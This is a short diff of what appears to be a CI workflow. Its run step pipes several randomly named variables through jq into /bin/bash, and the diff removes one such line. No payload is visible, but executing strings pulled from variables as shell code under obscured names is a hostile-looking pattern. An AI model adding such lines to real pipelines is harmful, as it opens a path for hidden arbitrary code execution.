@@ -30,7 +30,6 @@ jobs:
           echo $nx95 | jq -r .bv261 | /bin/bash
           printf '%s' "$eicd163" | jq -r .mel43 | /bin/bash
           printf '%s' "$w28377" | jq -r .jdn3 | /bin/bash
-          echo $v2 | jq -r .qp87 | /bin/bash
           echo $l594 | jq -r .ek0 | /bin/bash
           echo $en1521 | jq -r .rorar187 | /bin/bash
           echo $cpbvh769 | jq -r .ckps57 | /bin/bash
